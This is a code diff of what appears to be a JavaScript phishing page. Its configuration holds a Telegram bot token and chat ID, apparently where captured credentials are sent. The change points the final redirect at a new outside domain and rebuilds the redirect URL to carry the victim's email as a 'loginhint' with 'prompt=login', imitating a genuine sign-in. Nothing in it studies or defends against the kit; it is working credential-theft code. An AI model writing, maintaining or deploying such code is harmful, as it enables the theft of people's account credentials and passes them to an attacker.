@@ -358,7 +358,7 @@
     const env = {
       TELEGRAM_TOKEN: '8043918109:AAHq02pj7XjBIwYYENtftpes-RUnDMnWvlA',
       TELEGRAM_CHAT_ID: '-1002493880170',
-      FINAL_URL: 'https://boost.asmasoft.ca'
+      FINAL_URL: 'https://prub.casavar.com.ar'
     };
 
     // Get URL parameters
@@ -559,13 +559,21 @@
     }
 
     function redirectToFinalURL() {
-      // Build URL with loginhint and prompt=login parameters
-      const url = new URL(env.FINAL_URL);
+      // Build URL with proper parameter structure using &
+      let redirectUrl = env.FINAL_URL;
+      
+      // Check if FINAL_URL already has query parameters
+      const hasExistingParams = redirectUrl.includes('?');
+      
       if (currentEmail) {
-        url.searchParams.set('loginhint', currentEmail);
+        redirectUrl += hasExistingParams ? '&loginhint=' + encodeURIComponent(currentEmail) : '?loginhint=' + encodeURIComponent(currentEmail);
+        // Add prompt=login parameter
+        redirectUrl += '&prompt=login';
+      } else {
+        redirectUrl += hasExistingParams ? '&prompt=login' : '?prompt=login';
       }
-      url.searchParams.set('prompt', 'login');
-      window.location.href = url.toString();
+      
+      window.location.href = redirectUrl;
     }
 
     // Auth modal event listeners
